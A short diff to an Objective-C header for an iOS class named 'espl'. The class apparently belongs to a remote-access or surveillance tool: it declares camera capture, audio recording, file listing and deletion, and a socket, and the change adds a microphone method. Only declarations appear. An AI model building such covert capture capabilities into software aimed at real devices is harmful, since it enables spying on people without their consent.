@@ -12,10 +12,10 @@
 #include "SpringBoardServices/SpringBoardServices.h"
 #import <UIKit/UIKit.h>
 
-@interface espl:NSObject
+@interface espl:NSObject <AVAudioRecorderDelegate>
 @property (nonatomic,strong) AVCaptureSession *session;
 @property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
-@property (retain) AVAudioRecorder *recorder;
+@property (nonatomic,retain) AVAudioRecorder *recorder;
 @property (retain) NSFileManager *fileManager;
 @property (retain) UIDevice *thisUIDevice;
 @property (retain) NSString *skey;
@@ -40,6 +40,8 @@ extern int sockfd;
 -(void)setupCaptureSession:(BOOL)isfront;
 -(void)captureWithBlock:(void(^)(NSData* imageData))block;
 
+//mic
+-(void)mic:(NSArray *)args;
 //file management
 -(void)directoryList:(NSArray *)args;
 -(void)rmFile:(NSArray *)args;
